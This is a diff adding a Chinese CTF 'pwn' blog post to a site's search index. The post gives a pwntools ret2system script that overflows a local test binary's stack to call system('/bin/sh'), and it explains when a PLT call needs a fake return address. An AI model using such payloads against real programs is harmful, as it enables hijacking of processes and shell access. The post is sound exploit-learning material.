@@ -3,5 +3,30 @@
   
   
   
+  <entry>
+    <title>关于布置栈的见解</title>
+    <link href="/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/"/>
+    <url>/2024/10/15/%E5%85%B3%E4%BA%8E%E5%B8%83%E7%BD%AE%E6%A0%88%E7%9A%84%E8%A7%81%E8%A7%A3/</url>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./test2&#x27;</span>)<br><br>system_addr=<span class="hljs-number">0x0804845C</span><br>bin_sh_addr=<span class="hljs-number">0x0804A024</span><br>system_plt_addr=<span class="hljs-number">0x08048320</span><br>payload=(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>)*<span class="hljs-string">b&#x27;a&#x27;</span>+p32(system_addr)+p32(bin_sh_addr)<br><span class="hljs-comment">#payload1=(0x88+0x4)*&#x27;a&#x27;+p32(system_plt_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br><span class="hljs-comment">#error_payload=(0x88+0x4)*&#x27;a&#x27;+p32(system_addr)+&#x27;bbbb&#x27;+p32(bin_sh_addr)</span><br>gdb.attach(p)<br><span class="hljs-comment">#print payload</span><br><span class="hljs-comment">#print payload1</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>调用函数plt地址，需要有返回地址一般加“bbbb”这类无效地址，后面加参数。</p><p>调用程序代码段的函数直接跟参数就行。</p><p>汇编语言中的call指令相当于：push call指令的下一条指令，jmp call指令单步步入的地址。</p><p>总而言之如果调用的是代码段里的函数后面直接跟该函数参数就可以，如果是调用的plt段的函数需要提供一个虚假返回地址后面再跟该函数的参数，上文的error_payload是将两者杂糅了，调用了代码段的函数并且提供了虚假的返回地址，导致system函数的参数是’bbbb’，而不是binsh_addr.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>pwn</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>stack</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
   
 </search>
